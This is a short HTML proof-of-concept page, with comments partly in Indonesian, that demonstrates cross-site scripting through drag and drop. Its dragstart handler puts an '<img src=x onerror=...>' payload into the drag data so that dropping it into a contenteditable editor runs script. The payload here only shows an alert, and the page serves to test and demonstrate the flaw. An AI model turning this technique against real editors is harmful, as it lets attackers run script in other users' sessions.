<!DOCTYPE html>
<html>
<head>
  <title>Drag & Drop XSS PoC</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    #dragme {
      width: 150px; padding: 10px;
      background: #4caf50; color: white;
      cursor: grab; user-select: none;
    }
    #editor {
      width: 90%; height: 200px;
      border: 2px dashed #aaa; margin-top: 40px;
      padding: 10px;
    }
  </style>
</head>
<body>
  <h2>Copyâ€“Dragâ€“Drop XSS Demo</h2>
  <p>ðŸ‘‰ Drag kotak hijau ini dan drop ke editor di bawah</p>

  <div id="dragme" draggable="true">Drag Me</div>

  <h3>Target WYSIWYG (contenteditable)</h3>
  <div id="editor" contenteditable="true">
    Drop here...
  </div>

  <script>
    // Override data waktu drag
    let dragme = document.getElementById("dragme");
    dragme.addEventListener("dragstart", e => {
      // payload XSS
      let payload = `<img src=x onerror=alert('XSS via Drag&Drop')>`;
      e.dataTransfer.setData("text/html", payload);
      e.dataTransfer.setData("text/plain", payload);
    });

    // Optional: highlight editor saat dragover
    let editor = document.getElementById("editor");
    editor.addEventListener("dragover", e => e.preventDefault());
  </script>
</body>
</html>
